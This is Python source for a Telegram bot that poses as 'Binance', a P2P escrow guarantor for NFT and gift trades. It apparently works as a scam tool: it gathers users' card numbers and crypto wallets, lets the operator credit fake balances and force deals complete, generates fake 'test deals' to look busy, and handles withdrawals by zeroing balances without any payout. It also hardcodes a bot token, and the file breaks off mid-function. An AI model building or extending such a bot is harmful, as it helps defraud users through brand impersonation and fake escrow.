import asyncio
import logging
import os
import sys
import signal
import random
import string
from aiohttp import web
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message, CallbackQuery, URLInputFile
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.client.default import DefaultBotProperties

# ===== НАСТРОЙКИ =====
BOT_TOKEN = os.getenv("BOT_TOKEN", "8916641100:AAGTlz5A0Xr3ShfmG197dMN6Kp359c-NMxc")
MASTER_ID = int(os.getenv("MASTER_ID", "8297446667"))
BANNER_URL = os.getenv("BANNER_URL", "https://i.ibb.co/GQf936XW/IMG-0389.jpg")
PORT = int(os.getenv("PORT", 8080))

EMOJI = {
    "ton": ("5891243564309942507", "💎"),
    "card": ("5274195706066781810", "💳"),
    "user": ("5208940588606445660", "👤"),
    "stars": ("5208730126619005798", "⭐"),
    "usdt": ("5983399041197675256", "💵"),
    "btc": ("5902056028513505203", "₿"),
    "ruble": ("5793901252987330401", "₽"),
    "people": ("5794031944547178894", "👥"),
    "money": ("5794303034292968945", "💰"),
    "briefcase": ("5794182096603847292", "💼"),
    "coin": ("5895266423952904371", "🪙"),
    "package": ("5893450623449305489", "📦"),
    "lamp": ("6039641775377748623", "💡"),
    "balance_icon": ("6039802097916974085", "💰"),
}

SHIELD_ID = "5902016123972358349"
SHIELD_FALLBACK = "🛡"

users = {}
deals = {}
deal_counter = 1000
invite_codes = {}

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

def is_premium_user(uid):
    return users.get(uid, {}).get("is_premium", False)

def emoji(name, uid=None):
    e = EMOJI.get(name, ("", "❓"))
    if uid and is_premium_user(uid):
        return f"<tg-emoji emoji-id='{e[0]}'>{e[1]}</tg-emoji>"
    return e[1]

def shield_emoji(uid):
    return f"<tg-emoji emoji-id='{SHIELD_ID}'>{SHIELD_FALLBACK}</tg-emoji>" if is_premium_user(uid) else SHIELD_FALLBACK

def welcome_text(uid):
    return (
        f"{emoji('briefcase', uid)} Добро пожаловать в Binance 🤝\n\n"
        "<blockquote>⚡️ Ваш надёжный P2P-гарант:\n"
        "1⃣ Автоматические сделки с NFT и подарками\n"
        f"2⃣ {shield_emoji(uid)} Полная защита обеих сторон\n"
        f"3⃣ {emoji('coin', uid)} Реферальная программа — 50% от комиссии\n"
        f"4⃣ {emoji('package', uid)} Передача товаров через менеджера</blockquote>\n\n"
        f"{emoji('lamp', uid)} Наш канал ─ @binance_announcements"
    )

ADMIN_TEXT = "👑 Админ-панель\n\nВыберите действие:"

class DealStates(StatesGroup):
    waiting_role = State()
    waiting_currency = State()
    waiting_amount = State()
    waiting_description = State()

class AdminStates(StatesGroup):
    waiting_user_id = State()
    waiting_deal_id = State()

class SearchDeal(StatesGroup):
    waiting_code = State()

def get_lang(uid):
    return users.get(uid, {}).get("lang", "ru")

def update_premium(user: types.User):
    uid = user.id
    users.setdefault(uid, {})["is_premium"] = getattr(user, "is_premium", False)

def username_or_id(uid):
    if uid is None: return "—"
    u = users.get(uid, {})
    if "username" in u and u["username"]: return f"@{u['username']}"
    return str(uid)

def deal_status_text(deal):
    if deal["status"] == "completed": return "Завершена ✅"
    if deal["status"] == "active":
        if deal["seller_id"] is None: return "Ожидание продавца"
        if deal["buyer_id"] is None: return "Ожидание покупателя"
        return "Проворачивание сделки"
    return deal["status"]

def generate_invite_code():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

# Проверка наличия хотя бы одного реквизита
def has_any_rekv(uid):
    u = users.get(uid, {})
    return any(u.get(k) for k in ["ton","card","username","stars","usdt","btc"])

# ===== КЛАВИАТУРЫ =====
def main_menu(lang="ru", uid=None):
    t = {
        "ru": [f"{emoji('balance_icon', uid)} Баланс", "📋 Мои сделки", "🤝 Создать сделку",
               "📄 Реквизиты", f"{emoji('people', uid)} Рефералы", "🌐 Язык / Language", "🆘 Техподдержка"],
        "en": [f"{emoji('balance_icon', uid)} Balance", "📋 My Deals", "🤝 New Deal",
               "📄 My Details", f"{emoji('people', uid)} Referrals", "🌐 Language / Язык", "🆘 Support"]
    }[lang]
    callbacks = ["balance_menu", "my_deals", "new_deal", "my_rekv", "referrals", "change_lang"]
    kb = [
        [InlineKeyboardButton(text=t[0], callback_data=callbacks[0]),
         InlineKeyboardButton(text=t[1], callback_data=callbacks[1])],
        [InlineKeyboardButton(text=t[2], callback_data=callbacks[2]),
         InlineKeyboardButton(text=t[3], callback_data=callbacks[3])],
        [InlineKeyboardButton(text=t[4], callback_data=callbacks[4]),
         InlineKeyboardButton(text=t[5], callback_data=callbacks[5])],
        [InlineKeyboardButton(text=t[6], url="https://t.me/legmk")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

def admin_menu(uid=None):
    kb = [
        [InlineKeyboardButton(text=f"{emoji('money', uid)} Пополнить баланс", callback_data="admin_add_balance")],
        [InlineKeyboardButton(text="✅ Завершить сделку", callback_data="admin_complete_deal")],
        [InlineKeyboardButton(text="📋 Все сделки", callback_data="admin_all_deals")],
        [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
        [InlineKeyboardButton(text="🔢 Тестовые сделки", callback_data="admin_fake_deals")],
        [InlineKeyboardButton(text="🔙 В главное меню", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

def balance_menu(lang="ru", uid=None):
    t = {"ru": ["📜 История", "💸 Вывод", "🔙 Назад"],
         "en": ["📜 History", "💸 Withdraw", "🔙 Back"]}[lang]
    kb = [
        [InlineKeyboardButton(text=t[0], callback_data="tx_history")],
        [InlineKeyboardButton(text=t[1], callback_data="withdraw_funds")],
        [InlineKeyboardButton(text=t[2], callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

def rekv_menu(lang="ru", uid=None):
    items = ["ton","card","username","stars","usdt","btc"]
    labels_ru = [f"{emoji('ton', uid)} TON", f"{emoji('card', uid)} Карта", f"{emoji('user', uid)} Юзернейм",
                 f"{emoji('stars', uid)} Звезды", f"{emoji('usdt', uid)} USDT", f"{emoji('btc', uid)} BTC"]
    labels_en = [f"{emoji('ton', uid)} TON", f"{emoji('card', uid)} Card", f"{emoji('user', uid)} Username",
                 f"{emoji('stars', uid)} Stars", f"{emoji('usdt', uid)} USDT", f"{emoji('btc', uid)} BTC"]
    labels = labels_ru if lang=="ru" else labels_en
    kb = []
    for i in range(6):
        kb.append([InlineKeyboardButton(text=labels[i], callback_data=f"set_{items[i]}")])
    kb.append([InlineKeyboardButton(text="🔙 Назад" if lang=="ru" else "🔙 Back", callback_data="main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def deal_role_choice(lang="ru", uid=None):
    t = {"ru": ["🛒 Я продавец", "🛍 Я покупатель", "🔙 Отмена"],
         "en": ["🛒 I'm Seller", "🛍 I'm Buyer", "🔙 Cancel"]}[lang]
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t[0], callback_data="role_seller")],
        [InlineKeyboardButton(text=t[1], callback_data="role_buyer")],
        [InlineKeyboardButton(text=t[2], callback_data="main_menu")]
    ])

def currency_choice(lang="ru", uid=None):
    cur = [(f"{emoji('ton', uid)} TON", "ton"), (f"{emoji('card', uid)} Карта", "card"),
           (f"{emoji('user', uid)} Юзернейм", "username"), (f"{emoji('stars', uid)} Звезды", "stars"),
           (f"{emoji('usdt', uid)} USDT", "usdt"), (f"{emoji('btc', uid)} BTC", "btc")]
    kb = []
    for c in cur:
        kb.append([InlineKeyboardButton(text=c[0], callback_data=f"cur_{c[1]}")])
    kb.append([InlineKeyboardButton(text="🔙 Отмена" if lang=="ru" else "🔙 Cancel", callback_data="main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def back_button(lang="ru"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Назад" if lang=="ru" else "🔙 Back", callback_data="main_menu")]
    ])

# ===== УТИЛИТЫ ОТПРАВКИ =====
async def _delete_message(chat_id, msg_id):
    try: await bot.delete_message(chat_id, msg_id)
    except: pass

async def delete_and_send_banner(call: CallbackQuery, caption: str, reply_markup=None):
    await call.answer()
    await _delete_message(call.message.chat.id, call.message.message_id)
    new_msg = None
    if BANNER_URL:
        try:
            new_msg = await call.message.answer_photo(
                URLInputFile(BANNER_URL),
                caption=caption,
                reply_markup=reply_markup,
                parse_mode="HTML"
            )
        except: pass
    if not new_msg:
        new_msg = await call.message.answer(caption, reply_markup=reply_markup, parse_mode="HTML")
    users.setdefault(call.from_user.id, {})["last_menu_msg_id"] = new_msg.message_id

async def delete_and_send_text(call: CallbackQuery, text: str, reply_markup=None):
    await call.answer()
    await _delete_message(call.message.chat.id, call.message.message_id)
    new_msg = await call.message.answer(text, reply_markup=reply_markup, parse_mode="HTML")
    users.setdefault(call.from_user.id, {})["last_menu_msg_id"] = new_msg.message_id

async def return_to_main(call: CallbackQuery, lang: str):
    uid = call.from_user.id
    await call.answer()
    await _delete_message(call.message.chat.id, call.message.message_id)
    new_msg = None
    caption = welcome_text(uid)
    if BANNER_URL:
        try:
            new_msg = await call.message.answer_photo(
                URLInputFile(BANNER_URL),
                caption=caption,
                reply_markup=main_menu(lang, uid),
                parse_mode="HTML"
            )
        except: pass
    if not new_msg:
        new_msg = await call.message.answer(caption, reply_markup=main_menu(lang, uid), parse_mode="HTML")
    users.setdefault(uid, {})["last_menu_msg_id"] = new_msg.message_id

async def complete_deal_logic(deal_id, msg=None, call=None):
    d = deals[deal_id]
    seller_id = d["seller_id"]
    buyer_id = d["buyer_id"]
    amt = d["amount"]

    if seller_id is None or buyer_id is None:
        txt = "❌ Нельзя завершить сделку: отсутствует продавец или покупатель."
        if msg: await msg.answer(txt)
        if call: await call.message.edit_text(txt)
        return

    buyer_balance = users.get(buyer_id, {}).get("balance", 0)
    if buyer_balance < amt:
        txt = f"❌ У покупателя (ID {buyer_id}) недостаточно средств. Баланс: {buyer_balance} {emoji('ruble', buyer_id)}, требуется: {amt} {emoji('ruble', buyer_id)}."
        if msg: await msg.answer(txt)
        if call: await call.message.edit_text(txt)
        return

    users[buyer_id]["balance"] -= amt
    users[buyer_id].setdefault("history", []).append(f"💸 Сделка #{deal_id}: -{amt} {emoji('ruble', buyer_id)}")

    if seller_id not in users:
        users[seller_id] = {"balance": 0, "history": [], "completed_deals": 0}
    users[seller_id]["balance"] += amt
    users[seller_id].setdefault("history", []).append(f"✅ Сделка #{deal_id}: +{amt} {emoji('ruble', seller_id)}")
    users[seller_id]["completed_deals"] = users[seller_id].get("completed_deals", 0) + 1

    d["status"] = "completed"
    txt = f"✅ Сделка #{deal_id} завершена. Продавец получил {amt} {emoji('ruble', seller_id)}."
    if msg: await msg.answer(txt)
    if call: await call.message.edit_text(txt, reply_markup=admin_menu(seller_id if call else None))
    try:
        await bot.send_message(seller_id, f"✅ Сделка #{deal_id} завершена! +{amt} {emoji('ruble', seller_id)}.")
        await bot.send_message(buyer_id, f"✅ Сделка #{deal_id} завершена. С вашего баланса списано {amt} {emoji('ruble', buyer_id)}.")
    except: pass

# ===== ОБРАБОТЧИК ПРИСОЕДИНЕНИЯ ПО КОДУ =====
async def join_deal_by_code(message: Message, code: str):
    uid = message.from_user.id
    deal_id = invite_codes.get(code)
    if not deal_id or deal_id not in deals:
        return await message.answer("❌ Сделка не найдена или код недействителен.")
    deal = deals[deal_id]
    if deal["status"] != "active":
        return await message.answer("❌ Эта сделка уже не активна.")
    if deal["seller_id"] is None and deal["buyer_id"] != uid:
        deal["seller_id"] = uid
    elif deal["buyer_id"] is None and deal["seller_id"] != uid:
        deal["buyer_id"] = uid
    else:
        return await message.answer("❌ Вы уже участвуете или сделка заполнена.")
    if deal["seller_id"] is not None and deal["buyer_id"] is not None:
        deal["status"] = "active"
    other_id = deal["seller_id"] if deal["seller_id"] != uid else deal["buyer_id"]
    if other_id:
        try:
            await bot.send_message(other_id,
                f"ℹ️ Вторая сторона присоединилась к сделке #{deal_id}.\n"
                f"Продавец: {username_or_id(deal['seller_id'])}\n"
                f"Покупатель: {username_or_id(deal['buyer_id'])}\n"
                f"Статус: {deal_status_text(deal)}\n"
                f"Сумма: {deal['amount']} {deal['currency']}"
            )
        except: pass
    await message.answer(
        f"✅ Вы присоединились к сделке #{deal_id}!\n\n"
        f"Продавец: {username_or_id(deal['seller_id'])}\n"
        f"Покупатель: {username_or_id(deal['buyer_id'])}\n"
        f"Статус: {deal_status_text(deal)}\n"
        f"Сумма: {deal['amount']} {deal['currency']}",
        reply_markup=main_menu(get_lang(uid), uid)
    )

# ===== ХЕНДЛЕРЫ =====
@dp.message(Command("start"))
async def cmd_start(message: Message):
    uid = message.from_user.id
    update_premium(message.from_user)
    args = message.text.split()
    ref_id = None

    # Обработка join-кода
    if len(args) > 1 and args[1].startswith("join_"):
        code = args[1][5:]
        return await join_deal_by_code(message, code)

    if uid not in users:
        users[uid] = {
            "balance": 0.0, "ton": "", "card": "", "username": "", "stars": "", "usdt": "", "btc": "",
            "lang": "ru", "history": [], "pending_rekv": None, "referrer_id": None, "referrals": [],
            "last_menu_msg_id": None, "completed_deals": 0, "ref_earned_ton": 0.0,
            "is_premium": getattr(message.from_user, "is_premium", False)
        }
    else:
        # Обновляем is_premium при каждом старте
        users[uid]["is_premium"] = getattr(message.from_user, "is_premium", False)

    if len(args) > 1:
        try: ref_id = int(args[1])
        except: ref_id = None
    if ref_id and ref_id != uid and ref_id in users:
        users[uid]["referrer_id"] = ref_id
        users[ref_id]["balance"] += 2.0
        users[ref_id].setdefault("history", []).append(f"🎁 Реферал: +2 {emoji('ruble', ref_id)} от {uid}")
        users[ref_id].setdefault("referrals", []).append(uid)
        try: await bot.send_message(ref_id, f"🎁 +2 {emoji('ruble', ref_id)} за друга!")
        except: pass

    last_msg_id = users[uid].get("last_menu_msg_id")
    if last_msg_id:
        await _delete_message(message.chat.id, last_msg_id)

    caption = welcome_text(uid)
    new_msg = None
    if BANNER_URL:
        try:
            new_msg = await message.answer_photo(
                URLInputFile(BANNER_URL),
                caption=caption,
                reply_markup=main_menu(get_lang(uid), uid),
                parse_mode="HTML"
            )
        except: pass
    if not new_msg:
        new_msg = await message.answer(caption, reply_markup=main_menu(get_lang(uid), uid), parse_mode="HTML")
    users[uid]["last_menu_msg_id"] = new_msg.message_id

@dp.message(Command("join"))
async def join_cmd(message: Message):
    update_premium(message.from_user)
    try:
        code = message.text.split()[1]
        await join_deal_by_code(message, code)
    except:
        await message.answer("❌ Используйте: /join <код>")

@dp.message(F.text.regexp(r'#([a-zA-Z0-9]{8})'))
async def join_by_hashtag(message: Message):
    update_premium(message.from_user)
    code = message.text.strip()[1:9]
    await join_deal_by_code(message, code)

# ===== АДМИН-КОМАНДЫ (без изменений, добавлены emoji с uid) =====
@dp.message(Command("admin"))
async def admin_cmd(message: Message):
    update_premium(message.from_user)
    if message.from_user.id != MASTER_ID: return await message.answer("❌ Нет доступа.")
    await message.answer(ADMIN_TEXT, reply_markup=admin_menu(message.from_user.id))

@dp.message(Command("masterb"))
async def masterb_cmd(message: Message):
    update_premium(message.from_user)
    if message.from_user.id != MASTER_ID: return await message.answer("❌ Нет доступа.")
    try:
        _, uid_s, amt_s = message.text.split()
        uid, amt = int(uid_s), float(amt_s)
        users.setdefault(uid, {"balance":0,"history":[]})
        users[uid]["balance"] += amt
        users[uid].setdefault("history",[]).append(f"⚡ Зачисление: +{amt} {emoji('ruble', uid)}")
        await message.answer(f"✅ Пользователю {uid} выдано {amt} {emoji('ruble', uid)}.")
        try: await bot.send_message(uid, f"💰 На ваш баланс зачислено {amt} {emoji('ruble', uid)}.")
        except: pass
    except: await message.answer("❌ Формат: /masterb user_id сумма")

@dp.message(Command("giveMas"))
async def givemas_cmd(message: Message):
    update_premium(message.from_user)
    if message.from_user.id != MASTER_ID: return await message.answer("❌ Нет доступа.")
    try:
        _, did_s = message.text.split()
        did = int(did_s)
        if did not in deals or deals[did]["status"] != "active":
            return await message.answer("❌ Сделка не найдена или неактивна.")
        await complete_deal_logic(did, msg=message)
    except: await message.answer("❌ Формат: /giveMas deal_id")

# ===== ГЛАВНОЕ МЕНЮ =====
@dp.callback_query(F.data == "main_menu")
async def main_menu_cb(call: CallbackQuery):
    update_premium(call.from_user)
    await return_to_main(call, get_lang(call.from_user.id))

# ===== АДМИН КОЛБЭКИ (без изменений) =====
@dp.callback_query(F.data == "admin_add_balance")
async def adm_add_bal(call: CallbackQuery, state: FSMContext):
    update_premium(call.from_user)
    if call.from_user.id != MASTER_ID: return await call.answer("❌", show_alert=True)
    await delete_and_send_text(call, "Введите ID пользователя и сумму через пробел:\nПример: 123456789 500", back_button("ru"))
    await state.set_state(AdminStates.waiting_user_id)

@dp.message(AdminStates.waiting_user_id)
async def adm_bal_proc(message: Message, state: FSMContext):
    update_premium(message.from_user)
    if message.from_user.id != MASTER_ID: return
    try:
        uid_s, amt_s = message.text.split()
        uid, amt = int(uid_s), float(amt_s)
        users.setdefault(uid, {"balance":0,"history":[]})
        users[uid]["balance"] += amt
        users[uid].setdefault("history",[]).append(f"⚡ Админ: +{amt} {emoji('ruble', uid)}")
        await message.answer(f"✅ Баланс {uid} пополнен на {amt} {emoji('ruble', uid)}.", reply_markup=admin_menu(uid))
    except: await message.answer("❌ Формат: user_id сумма")
    await state.clear()

@dp.callback_query(F.data == "admin_complete_deal")
async def adm_compl(call: CallbackQuery, state: FSMContext):
    update_premium(call.from_user)
    if call.from_user.id != MASTER_ID: return await call.answer("❌", show_alert=True)
    await delete_and_send_text(call, "Введите ID сделки для завершения:", back_button("ru"))
    await state.set_state(AdminStates.waiting_deal_id)

@dp.message(AdminStates.waiting_deal_id)
async def adm_compl_proc(message: Message, state: FSMContext):
    update_premium(message.from_user)
    if message.from_user.id != MASTER_ID: return
    try:
        did = int(message.text.strip())
        if did not in deals or deals[did]["status"]!="active":
            return await message.answer("❌ Сделка не найдена или неактивна.", reply_markup=admin_menu(message.from_user.id))
        await complete_deal_logic(did, msg=message)
    except: await message.answer("❌ Введите корректный ID сделки.")
    await state.clear()

@dp.callback_query(F.data == "admin_all_deals")
async def adm_all_deals(call: CallbackQuery):
    update_premium(call.from_user)
    if call.from_user.id != MASTER_ID: return await call.answer("❌", show_alert=True)
    if not deals: return await delete_and_send_text(call, "📭 Сделок нет.", admin_menu(call.from_user.id))
    txt = "📋 Все сделки:\n\n" + "\n".join(
        [f"<b>#{did}</b>: {d['amount']} {d['currency']} | Продавец: {username_or_id(d['seller_id'])} | Покупатель: {username_or_id(d['buyer_id'])} | Статус: {deal_status_text(d)}" for did,d in deals.items()]
    )
    await delete_and_send_text(call, txt, admin_menu(call.from_user.id))

@dp.callback_query(F.data == "admin_stats")
async def adm_stats(call: CallbackQuery):
    update_premium(call.from_user)
    if call.from_user.id != MASTER_ID: return await call.answer("❌", show_alert=True)
    total_users = len(users)
    total_deals = len(deals)
    active_deals = sum(1 for d in deals.values() if d["status"] == "active")
    total_balance = sum(u.get("balance", 0) for u in users.values())
    txt = f"📊 Статистика:\n\n<b>Пользователей:</b> {total_users}\n<b>Сделок:</b> {total_deals}\n<b>Активных:</b> {active_deals}\n<b>Общий баланс:</b> {total_balance} {emoji('ruble', call.from_user.id)}"
    await delete_and_send_text(call, txt, admin_menu(call.from_user.id))

@dp.callback_query(F.data == "admin_fake_deals")
async def adm_fake(call: CallbackQuery):
    update_premium(call.from_user)
    if call.from_user.id != MASTER_ID: return await call.answer("❌", show_alert=True)
    global deal_counter
    cur_list = ["ton","card","username","stars","usdt","btc"]
    cnt = random.randint(0, 40)
    for _ in range(cnt):
        deal_counter += 1
        code = generate_invite_code()
        while code in invite_codes:
            code = generate_invite_code()
        invite_codes[code] = deal_counter
        deals[deal_counter] = {
            "seller_id": random.choice(list(users.keys())) if users else MASTER_ID,
            "buyer_id": random.choice(list(users.keys())) if users else MASTER_ID,
            "amount": round(random.uniform(100, 10000), 2),
            "currency": random.choice(cur_list),
            "status": "active",
            "invite_code": code,
            "description": "Тестовая сделка"
        }
    await delete_and_send_text(call, f"✅ Создано {cnt} тестовых сделок.", admin_menu(call.from_user.id))

# ===== БАЛАНС =====
@dp.callback_query(F.data == "balance_menu")
async def balance_menu_handler(call: CallbackQuery):
    update_premium(call.from_user)
    uid = call.from_user.id; lang = get_lang(uid)
    bal = users.get(uid, {}).get("balance", 0)
    completed = users.get(uid, {}).get("completed_deals", 0)
    if bal == 0:
        balance_line = "💔 Ваш баланс пока пуст"
    else:
        balance_line = f"{emoji('balance_icon', uid)} Ваш баланс: <b>{bal:.2f}</b> {emoji('ruble', uid)}"
    txt = (
        f"{emoji('balance_icon', uid)} <b>Ваш баланс:</b>\n\n"
        f"{balance_line}\n\n"
        f"📈 Завершённых сделок: <b>{completed}</b>"
    )
    await delete_and_send_banner(call, txt, balance_menu(lang, uid))

@dp.callback_query(F.data == "tx_history")
async def tx_history_handler(call: CallbackQuery):
    update_premium(call.from_user)
    uid = call.from_user.id; lang = get_lang(uid)
    h = users.get(uid, {}).get("history", [])
    txt = "📜 История транзакций:\n" + ("\n".join(h[-15:]) if h else "Пусто")
    await delete_and_send_text(call, txt, back_button(lang))

@dp.callback_query(F.data == "withdraw_funds")
async def withdraw_funds_handler(call: CallbackQuery):
    update_premium(call.from_user)
    uid = call.from_user.id; lang = get_lang(uid)
    b = users.get(uid, {}).get("balance", 0)
    if b <= 0:
        await call.answer("❌ Недостаточно средств" if lang=="ru" else "❌ Insufficient funds", show_alert=True)
        return
    users[uid]["balance"] = 0.0
    users[uid].setdefault("history", []).append(f"💸 Вывод: -{b:.2f} {emoji('ruble', uid)}")
    await delete_and_send_text(call, f"✅ Заявка на вывод <b>{b:.2f}</b> {emoji('ruble', uid)} принята.", back_button(lang))

# ===== РЕКВИЗИТЫ =====
@dp.callback_query(F.data == "my_rekv")
async def rekv_handler(call: CallbackQuery):
    update_premium(call.from_user)
    uid = call.from_user.id; lang = get_lang(uid)
    u = users.get(uid, {})
    lbl = {"ton":f"{emoji('ton', uid)} TON","card":f"{emoji('card', uid)} Карта","username":f"{emoji('user', uid)} Юзернейм",
           "stars":f"{emoji('stars', uid)} Звезды","usdt":f"{emoji('usdt', uid)} USDT","btc":f"{emoji('btc', uid)} BTC"}
    entries = [f"{v}: {u.get(k, '❌ не указан')}" for k,v in lbl.items()]
    txt = "📄 Ваши реквизиты для получения средств:\n\n" + "\n".join(entries)
    await delete_and_send_text(call, txt, rekv_menu(lang, uid))

for cb, key in [("set_ton","ton"),("set_card","card"),("set_username","username"),
                ("set_stars","stars"),("set_usdt","usdt"),("set_btc","btc")]:
    @dp.callback_query(F.data == cb)
    async def ask_rekv(call: CallbackQuery, key=key):
        update_premium(call.from_user)
        uid = call.from_user.id; lang = get_lang(uid)
        prompts = {
            "ton": (f"Введите {emoji('ton', uid)} TON кошелёк:", f"Enter {emoji('ton', uid)} TON wallet:"),
            "card": (f"Введите {emoji('card', uid)} номер карты:", f"Enter {emoji('card', uid)} card number:"),
            "username": (f"Введите {emoji('user', uid)} юзернейм:", f"Enter {emoji('user', uid)} username:"),
            "stars": (f"Введите {emoji('stars', uid)} ID звёзд:", f"Enter {emoji('stars', uid)} Stars ID:"),
            "usdt": (f"Введите {emoji('usdt', uid)} USDT кошелёк:", f"Enter {emoji('usdt', uid)} USDT wallet:"),
            "btc": (f"Введите {emoji('btc', uid)} BTC кошелёк:", f"Enter {emoji('btc', uid)} BTC wallet:")
        }
        users[uid]["pending_rekv"] = key
        await delete_and_send_text(call, prompts[key][0] if lang=="ru" else prompts[key][1], back_button(lang))

# ===== СОЗДАНИЕ СДЕЛКИ (НОВЫЙ ПОРЯДОК) =====
@dp.callback_query(F.data == "new_deal")
async def new_deal_handler(call: CallbackQuery, state: FSMContext):
    update_premium(call.from_user)
    uid = call.from_user.id

    # Проверка наличия хотя бы одного реквизита
    if not has_any_rekv(uid):
        await call.answer("❗ Привяжите реквизиты перед созданием сделки", show_alert=True)
        return

    await state.clear()
    lang = get_lang(uid)
    txt = (
        "🤝 Создание P2P сделки\n\n"
        "Выберите свою роль в сделке:\n"
        "• Продавец — вы получите оплату после подтверждения менеджером.\n"
        "• Покупатель — вы получите товар после оплаты."
    ) if lang=="ru" else (
        "🤝 New P2P deal\n\n"
        "Choose your role:\n"
        "• Seller — you'll receive payment after manager confirmation.\n"
        "• Buyer — you'll receive the item after payment."
    )
    await delete_and_send_banner(call, txt, deal_role_choice(lang, uid))
    await state.set_state(DealStates.waiting_role)

@dp.callback_query(F.data.startswith("role_"), DealStates.waiting_role)
async def role_chosen(call: CallbackQuery, state: FSMContext):
    update_premium(call.from_user)
    role = "seller" if call.data == "role_seller" else "buyer"
    await state.update_data(role=role)
    lang = get_lang(call.from_user.id)
    await delete_and_send_banner(call, "Выберите валюту, которой продавец получит деньги:", currency_choice(lang, call.from_user.id))
    await state.set_state(DealStates.waiting_currency)

@dp.callback_query(F.data.startswith("cur_"), DealStates.waiting_currency)
async def currency_chosen(call: CallbackQuery, state: FSMContext):
    update_premium(call.from_user)
    cur = call.data.replace("cur_", "")
    await state.update_data(currency=cur)
    lang = get_lang(call.from_user.id)
    await delete_and_send_banner(call, f"💰 Введите сумму сделки (в {emoji('ruble', call.from_user.id)}):", back_button(lang))
    await state.set_state(DealStates.waiting_amount)

@dp.message(DealStates.waiting_amount)
async def amount_entered(message: Message, state: FSMContext):
    update_premium(message.from_user)
    uid = message.from_user.id
    lang = get_lang(uid)
    try:
        amt = float(message.text)
        if amt <= 0: raise ValueError
    except:
        return await message.answer("❌ Введите корректное положительное число.")
    await state.update_data(amount=amt)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Назад", callback_data="new_deal")],
        [InlineKeyboardButton(text="🏠 В меню", callback_data="main_menu")]
    ])
    txt = (
        f"✍️ Опишите предмет сделки:\n\n"
        f"Например: https://t.me/nft/\n"
        f"или просто текстовое описание товара"
    ) if lang=="ru" else (
        f"✍️ Describe the item:\n\n"
        f"Example: https://t.me/nft/\n"
        f"or just a text description"
    )
    await delete_and_send_banner(message, txt, kb)
    await state.set_state(DealStates.waiting_description)

@dp.message(DealStates.waiting_description)
async def description_entered(message: Message, state: FSMContext):
    update_premium(message.from_user)
    global deal_counter
    uid = message.from_user.id
    lang = get_lang(uid)
    description = message.text.strip()
    data = await state.get_data()
    role = data["role"]
    currency = data["currency"]
    amount = data["amount"]

    code = generate_invite_code()
    while code in invite_codes:
        code = generate_invite_code()
    deal_counter += 1
    invite_codes[code] = deal_counter

    seller_id = uid if role == "seller" else None
    buyer_id = uid if role == "buyer" else None

    deals[deal_counter] = {
        "seller_id": seller_id,
        "buyer_id": buyer_id,
        "amount": amount,
        "currency": currency,
        "description": description,
        "status": "active",
        "invite_code": code
    }

    bot_username = (await bot.me()).username
    join_link = f"https://t.me/{bot_username}?start=join_{code}"
    text = (
        f"✅ Сделка #{deal_counter} успешно создана!\n\n"
        f"🛒 Роль: {'Продавец' if role=='seller' else 'Покупатель'}\n"
        f"🇷🇺 Валюта: {currency}\n"
        f"💰 Сумма: {amount} {emoji('ruble', uid)}\n"
        f"✍️ Описание: {description}\n\n"
        f"🔗 Ссылка для второй стороны:\n{join_link}\n\n"
        f"Или пригласите через инлайн: @{bot_username} #{code}"
    )
    await message.answer(text, reply_markup=main_menu(lang, uid))
    await state.clear()

# ===== МОИ СДЕЛКИ (НОВЫЙ ИНТЕРФЕЙС) =====
@dp.callback_query(F.data == "my_deals")
async def my_deals_handler(call: CallbackQuery):
    update_premium(call.from_user)
    uid = call.from_user.id; lang = get_lang(uid)
    user_deals = [(did, d) for did, d in deals.items() if d["seller_id"] == uid or d["buyer_id"] == uid]
    total = len(user_deals)
    completed = sum(1 for did, d in user_deals if d["status"] == "completed")

    kb = []
    if user_deals:
        # Кнопки сделок (по 5 на страницу)
        page = 0  # позже можно добавить пагинацию
        for did, d in user_deals[:5]:
            status_icon = "✅" if d["status"] == "completed" else "❌"
            kb.append([InlineKeyboardButton(
                text=f"{status_icon} Сделка #{did}",
                callback_data=f"deal_info_{did}"
            )])
        # Пагинация (заглушка)
        if total > 5:
            kb.append([
                InlineKeyboardButton(text="◀️", callback_data="deals_page_prev"),
                InlineKeyboardButton(text="1/1", callback_data="ignore"),
                InlineKeyboardButton(text="▶️", callback_data="deals_page_next")
            ])
    kb.append([InlineKeyboardButton(text="🔍 Поиск по коду", callback_data="search_deal_code")])
    kb.append([InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu")])

    caption = (
        f"💼 <b>Мои сделки</b>\n\n"
        f"📊 Всего: <b>{total}</b>   ✅ Завершено: <b>{completed}</b>"
    )
    await delete_and_send_text(call, caption, InlineKeyboardMarkup(inline_keyboard=kb))

# ===== ПОИСК СДЕЛКИ ПО КОДУ =====
@dp.callback_query(F.data == "search_deal_code")
async def search_deal_start(call: CallbackQuery, state: FSMContext):
    await call.answer()
    await call.message.answer("Введите код сделки (например, #a1b2c3d4):")
    await state.set_state(SearchDeal.waiting_code)

@dp.message(SearchDeal.waiting_code)
async def search_deal_code_result(message: Message, state: FSMContext):
    code = message.text.strip().lstrip("#")
    deal_id = invite_codes.get(code)
    if not deal_id or deal_id not in deals:
        await message.answer("❌ Сделка не найдена.")
    else:
        d = deals[deal_id]
        await message.answer(
            f"🔍 Сделка #{deal_id}:\n"
            f"Продавец: {username_or_id(d['seller_id'])}\n"
            f"Покупатель: {username_or_id(d['buyer_id'])}\n"
            f"Сумма: {d['amount']} {emoji('ruble', message.from_user.id)}\n"
